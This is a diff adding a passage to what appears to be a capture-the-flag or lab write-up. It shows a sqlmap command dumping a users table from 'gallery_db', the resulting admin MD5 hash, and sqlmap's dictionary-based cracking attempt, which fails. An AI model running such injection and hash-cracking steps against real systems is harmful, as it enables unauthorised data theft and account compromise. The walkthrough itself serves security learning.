@@ -214,3 +214,41 @@ Now I can get records for the users table. If I don't want to filter the columns
 In my case I want to filter it. This is because it will ask yes or no questions over and over to get each character of data. That takes a lot of time and I want to speed things up. Here is the command I run to filter the columns that I want for each record:
 
 `sqlmap -r request.txt -D gallery_db -T users -C firstname,username,password --dump`
+
+This produces the following output:
+
+```bash
+Database: gallery_db
+Table: users
+[1 entry]
++--------------+----------------------------------+----------+
+| firstname    | password                         | username |
++--------------+----------------------------------+----------+
+| Adminstrator | a228b12a08b6527e7978cbe5d914531c | admin    |
++--------------+----------------------------------+----------+
+```
+
+### Cracking Password Hashes
+
+In the previous output sqlmap noticed that the password value was a hash and so it asked if I wanted to have it try to crack the hash. This is optional and so I could have skipped it but I ran it to show an example. If it was able to crack the hash, it would have output the value. Here is the output:
+
+```bash
+[05:26:29] [INFO] adjusting time delay to 1 second due to good response times
+a228b12a08b6527e7978cbe5d914531c
+[05:28:11] [INFO] retrieved: Adminstrator
+[05:28:48] [INFO] retrieved: admin
+[05:29:02] [INFO] recognized possible password hashes in column '`password`'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+do you want to crack them via a dictionary-based attack? [Y/n/q] 
+[05:29:20] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[05:29:23] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] 
+[05:29:25] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[05:29:25] [INFO] starting 2 processes 
+[05:29:56] [WARNING] no clear password(s) found
+```
